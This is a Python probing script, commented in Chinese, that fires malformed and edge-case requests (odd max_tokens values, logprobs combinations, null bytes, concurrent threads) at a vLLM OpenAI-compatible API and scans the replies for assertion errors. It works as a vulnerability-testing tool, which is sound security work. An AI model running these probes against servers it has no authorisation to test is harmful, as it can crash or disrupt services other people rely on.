#!/usr/bin/env python3
"""
高级vLLM Assert漏洞利用脚本
分析为什么常规测试无法触发assert，并尝试更精确的攻击方法
"""

import requests
import json
import time
import sys
import threading
from typing import Dict, Any, Optional, List

class AdvancedVLLMAssertExploit:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Advanced-vLLM-Assert-Exploit/2.0'
        })
        
    def analyze_server_response(self, response) -> Dict[str, Any]:
        """分析服务器响应，提取有用信息"""
        analysis = {
            'status_code': response.status_code,
            'has_error': False,
            'error_type': None,
            'assert_detected': False,
            'response_size': len(response.text),
            'headers': dict(response.headers),
            'response_snippet': response.text[:500]
        }
        
        response_lower = response.text.lower()
        
        # 检查各种错误类型
        error_indicators = [
            'assertionerror', 'assert', 'traceback', 'exception',
            'internal server error', 'unhandled exception',
            'did not output logprobs', 'max_tokens', 'final_res'
        ]
        
        for indicator in error_indicators:
            if indicator in response_lower:
                analysis['has_error'] = True
                analysis['error_type'] = indicator
                if 'assert' in indicator:
                    analysis['assert_detected'] = True
                break
        
        return analysis
    
    def test_logprobs_edge_cases(self) -> List[Dict[str, Any]]:
        """测试logprobs的边界情况"""
        print("[*] Testing logprobs edge cases...")
        
        url = f"{self.base_url}/v1/chat/completions"
        results = []
        
        # 测试用例1: 极小的max_tokens + logprobs
        test_cases = [
            {
                "name": "tiny_max_tokens_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,  # 极小值
                    "temperature": 0.0
                }
            },
            {
                "name": "zero_max_tokens_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo", 
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 0,  # 零值
                    "temperature": 0.0
                }
            },
            {
                "name": "high_top_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 100,  # 极大值
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            },
            {
                "name": "empty_message_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": ""}],  # 空消息
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            },
            {
                "name": "special_chars_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "\x00\x01\x02"}],  # 特殊字符
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            }
        ]
        
        for test_case in test_cases:
            print(f"  Testing: {test_case['name']}")
            try:
                response = self.session.post(url, json=test_case['payload'], timeout=10)
                analysis = self.analyze_server_response(response)
                analysis['test_name'] = test_case['name']
                results.append(analysis)
                
                if analysis['assert_detected']:
                    print(f"    [!] ASSERT DETECTED in {test_case['name']}!")
                    print(f"    [!] Response: {analysis['response_snippet'][:200]}...")
                
            except Exception as e:
                print(f"    [-] Error in {test_case['name']}: {e}")
                results.append({
                    'test_name': test_case['name'],
                    'error': str(e),
                    'assert_detected': False
                })
        
        return results
    
    def test_completion_edge_cases(self) -> List[Dict[str, Any]]:
        """测试completion接口的边界情况"""
        print("[*] Testing completion edge cases...")
        
        url = f"{self.base_url}/v1/completions"
        results = []
        
        test_cases = [
            {
                "name": "echo_no_max_tokens",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    # 故意不设置max_tokens
                    "temperature": 0.0
                }
            },
            {
                "name": "echo_zero_max_tokens",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    "max_tokens": 0,
                    "temperature": 0.0
                }
            },
            {
                "name": "echo_negative_max_tokens",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    "max_tokens": -1,  # 负值
                    "temperature": 0.0
                }
            },
            {
                "name": "echo_huge_max_tokens",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    "max_tokens": 999999,  # 极大值
                    "temperature": 0.0
                }
            },
            {
                "name": "echo_with_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "prompt": "Hello",
                    "echo": True,
                    "logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            }
        ]
        
        for test_case in test_cases:
            print(f"  Testing: {test_case['name']}")
            try:
                response = self.session.post(url, json=test_case['payload'], timeout=10)
                analysis = self.analyze_server_response(response)
                analysis['test_name'] = test_case['name']
                results.append(analysis)
                
                if analysis['assert_detected']:
                    print(f"    [!] ASSERT DETECTED in {test_case['name']}!")
                    print(f"    [!] Response: {analysis['response_snippet'][:200]}...")
                
            except Exception as e:
                print(f"    [-] Error in {test_case['name']}: {e}")
                results.append({
                    'test_name': test_case['name'],
                    'error': str(e),
                    'assert_detected': False
                })
        
        return results
    
    def test_streaming_edge_cases(self) -> List[Dict[str, Any]]:
        """测试流式响应的边界情况"""
        print("[*] Testing streaming edge cases...")
        
        url = f"{self.base_url}/v1/chat/completions"
        results = []
        
        test_cases = [
            {
                "name": "stream_tiny_tokens_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "stream": True,
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            },
            {
                "name": "stream_zero_tokens_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "stream": True,
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 0,
                    "temperature": 0.0
                }
            },
            {
                "name": "stream_interrupt_logprobs",
                "payload": {
                    "model": "gpt-3.5-turbo",
                    "messages": [{"role": "user", "content": "Generate a very long response about AI"}],
                    "stream": True,
                    "logprobs": True,
                    "top_logprobs": 5,
                    "max_tokens": 100,
                    "temperature": 0.0
                }
            }
        ]
        
        for test_case in test_cases:
            print(f"  Testing: {test_case['name']}")
            try:
                response = self.session.post(url, json=test_case['payload'], 
                                           stream=True, timeout=15)
                
                # 对于流式响应，我们需要读取所有数据
                stream_data = []
                line_count = 0
                has_error = False
                
                for line in response.iter_lines():
                    if line:
                        line_str = line.decode('utf-8')
                        stream_data.append(line_str)
                        line_count += 1
                        
                        # 检查错误
                        if any(keyword in line_str.lower() for keyword in 
                               ['error', 'assert', 'exception', 'traceback']):
                            has_error = True
                            print(f"    [!] Error in stream line {line_count}: {line_str}")
                        
                        # 限制读取行数
                        if line_count > 20:
                            break
                
                results.append({
                    'test_name': test_case['name'],
                    'status_code': response.status_code,
                    'line_count': line_count,
                    'has_error': has_error,
                    'assert_detected': has_error and 'assert' in '\n'.join(stream_data).lower(),
                    'sample_data': stream_data[:5]  # 前5行数据
                })
                
            except Exception as e:
                print(f"    [-] Error in {test_case['name']}: {e}")
                results.append({
                    'test_name': test_case['name'],
                    'error': str(e),
                    'assert_detected': False
                })
        
        return results
    
    def test_model_specific_cases(self) -> List[Dict[str, Any]]:
        """测试特定模型的情况"""
        print("[*] Testing model-specific cases...")
        
        url = f"{self.base_url}/v1/chat/completions"
        results = []
        
        # 首先获取可用模型
        try:
            models_response = self.session.get(f"{self.base_url}/v1/models", timeout=5)
            if models_response.status_code == 200:
                models_data = models_response.json()
                available_models = [model['id'] for model in models_data.get('data', [])]
                print(f"  Available models: {available_models[:3]}...")  # 显示前3个
            else:
                available_models = ["gpt-3.5-turbo"]  # 默认模型
        except:
            available_models = ["gpt-3.5-turbo"]
        
        # 使用第一个可用模型进行测试
        test_model = available_models[0] if available_models else "gpt-3.5-turbo"
        
        test_cases = [
            {
                "name": "real_model_logprobs",
                "payload": {
                    "model": test_model,
                    "messages": [{"role": "user", "content": "What is 2+2?"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            },
            {
                "name": "nonexistent_model_logprobs",
                "payload": {
                    "model": "definitely-not-a-real-model-12345",
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            },
            {
                "name": "empty_model_logprobs",
                "payload": {
                    "model": "",  # 空模型名
                    "messages": [{"role": "user", "content": "Hi"}],
                    "logprobs": True,
                    "top_logprobs": 1,
                    "max_tokens": 1,
                    "temperature": 0.0
                }
            }
        ]
        
        for test_case in test_cases:
            print(f"  Testing: {test_case['name']}")
            try:
                response = self.session.post(url, json=test_case['payload'], timeout=10)
                analysis = self.analyze_server_response(response)
                analysis['test_name'] = test_case['name']
                results.append(analysis)
                
                if analysis['assert_detected']:
                    print(f"    [!] ASSERT DETECTED in {test_case['name']}!")
                    print(f"    [!] Response: {analysis['response_snippet'][:200]}...")
                
            except Exception as e:
                print(f"    [-] Error in {test_case['name']}: {e}")
                results.append({
                    'test_name': test_case['name'],
                    'error': str(e),
                    'assert_detected': False
                })
        
        return results
    
    def test_race_conditions(self) -> List[Dict[str, Any]]:
        """测试竞态条件"""
        print("[*] Testing race conditions...")
        
        results = []
        
        def concurrent_request(thread_id: int, results_list: List):
            url = f"{self.base_url}/v1/chat/completions"
            payload = {
                "model": "gpt-3.5-turbo",
                "messages": [{"role": "user", "content": f"Thread {thread_id}"}],
                "logprobs": True,
                "top_logprobs": 1,
                "max_tokens": 1,
                "temperature": 0.0
            }
            
            try:
                response = self.session.post(url, json=payload, timeout=10)
                analysis = self.analyze_server_response(response)
                analysis['thread_id'] = thread_id
                results_list.append(analysis)
                
                if analysis['assert_detected']:
                    print(f"    [!] Thread {thread_id}: ASSERT DETECTED!")
                
            except Exception as e:
                results_list.append({
                    'thread_id': thread_id,
                    'error': str(e),
                    'assert_detected': False
                })
        
        # 启动多个并发线程
        thread_results = []
        threads = []
        
        for i in range(10):
            t = threading.Thread(target=concurrent_request, args=(i, thread_results))
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        results.extend(thread_results)
        
        # 分析结果
        assert_count = sum(1 for r in thread_results if r.get('assert_detected', False))
        error_count = sum(1 for r in thread_results if 'error' in r)
        
        print(f"  Concurrent test results: {assert_count} asserts, {error_count} errors")
        
        return results
    
    def analyze_why_no_vulnerabilities(self) -> Dict[str, Any]:
        """分析为什么没有发现漏洞"""
        print("[*] Analyzing why no vulnerabilities were found...")
        
        analysis = {
            'possible_reasons': [],
            'server_info': {},
            'recommendations': []
        }
        
        # 1. 检查服务器版本和配置
        try:
            # 尝试获取服务器信息
            response = self.session.get(f"{self.base_url}/v1/models", timeout=5)
            if response.status_code == 200:
                analysis['server_info']['models_endpoint'] = 'accessible'
                analysis['server_info']['response_headers'] = dict(response.headers)
            else:
                analysis['server_info']['models_endpoint'] = f'error_{response.status_code}'
        except Exception as e:
            analysis['server_info']['models_endpoint'] = f'exception_{str(e)}'
        
        # 2. 分析可能的原因
        reasons = [
            "服务器可能运行在优化模式(-O)，assert语句被移除",
            "服务器可能已经修复了这些assert漏洞",
            "服务器可能使用了不同的代码分支或版本",
            "服务器可能有额外的错误处理层",
            "请求可能被防火墙或代理过滤",
            "模型可能总是返回logprobs，避免了assert触发",
            "服务器可能使用了不同的OpenAI兼容实现"
        ]
        
        analysis['possible_reasons'] = reasons
        
        # 3. 提供建议
        recommendations = [
            "尝试不同的模型名称和参数组合",
            "检查服务器是否真的是vLLM实现",
            "尝试在开发模式下运行服务器",
            "检查服务器日志以获取更多信息",
            "尝试更极端的边界情况",
            "考虑其他类型的漏洞测试"
        ]
        
        analysis['recommendations'] = recommendations
        
        return analysis
    
    def run_comprehensive_test(self) -> Dict[str, Any]:
        """运行全面的测试"""
        print("=" * 60)
        print("Advanced vLLM Assert Vulnerability Analysis")
        print("=" * 60)
        print(f"Target: {self.base_url}")
        print()
        
        # 检查服务器可用性
        try:
            response = self.session.get(f"{self.base_url}/v1/models", timeout=5)
            if response.status_code != 200:
                print(f"[-] Server not available (status: {response.status_code})")
                return {'error': 'server_not_available'}
        except Exception as e:
            print(f"[-] Server not available (error: {e})")
            return {'error': 'server_not_available'}
        
        print("[+] Server is available, starting comprehensive analysis...")
        print()
        
        # 运行各种测试
        all_results = {}
        
        test_functions = [
            ('logprobs_edge_cases', self.test_logprobs_edge_cases),
            ('completion_edge_cases', self.test_completion_edge_cases),
            ('streaming_edge_cases', self.test_streaming_edge_cases),
            ('model_specific_cases', self.test_model_specific_cases),
            ('race_conditions', self.test_race_conditions),
        ]
        
        for test_name, test_func in test_functions:
            print(f"\n{'='*40}")
            try:
                results = test_func()
                all_results[test_name] = results
                
                # 统计结果
                assert_count = sum(1 for r in results if r.get('assert_detected', False))
                total_count = len(results)
                
                if assert_count > 0:
                    print(f"[!] {test_name}: {assert_count}/{total_count} tests found asserts!")
                else:
                    print(f"[+] {test_name}: No asserts detected ({total_count} tests)")
                
            except Exception as e:
                print(f"[-] {test_name}: Test failed with error: {e}")
                all_results[test_name] = {'error': str(e)}
            
            time.sleep(0.5)
        
        # 分析为什么没有发现漏洞
        print(f"\n{'='*40}")
        analysis = self.analyze_why_no_vulnerabilities()
        all_results['analysis'] = analysis
        
        # 生成最终报告
        print(f"\n{'='*60}")
        print("COMPREHENSIVE ANALYSIS SUMMARY:")
        print(f"{'='*60}")
        
        total_asserts = 0
        total_tests = 0
        
        for test_name, results in all_results.items():
            if test_name == 'analysis':
                continue
                
            if isinstance(results, list):
                test_asserts = sum(1 for r in results if r.get('assert_detected', False))
                test_count = len(results)
                total_asserts += test_asserts
                total_tests += test_count
                
                status = "VULNERABLE" if test_asserts > 0 else "Safe"
                print(f"{test_name:25} : {status} ({test_asserts}/{test_count})")
        
        print(f"\nOverall: {total_asserts}/{total_tests} tests found assert vulnerabilities")
        
        if total_asserts == 0:
            print(f"\n[?] No assert vulnerabilities found. Possible reasons:")
            for reason in analysis['possible_reasons'][:5]:
                print(f"    - {reason}")
            
            print(f"\n[*] Recommendations for further testing:")
            for rec in analysis['recommendations'][:3]:
                print(f"    - {rec}")
        else:
            print(f"\n[!] WARNING: Found {total_asserts} assert vulnerabilities!")
        
        return all_results

def main():
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = "http://localhost:8000"
    
    exploit = AdvancedVLLMAssertExploit(base_url)
    results = exploit.run_comprehensive_test()
    
    # 返回适当的退出码
    total_asserts = sum(
        sum(1 for r in test_results if r.get('assert_detected', False))
        for test_name, test_results in results.items()
        if isinstance(test_results, list)
    )
    
    if total_asserts > 0:
        sys.exit(1)  # 发现漏洞
    else:
        sys.exit(0)  # 未发现漏洞

if __name__ == "__main__":
    main()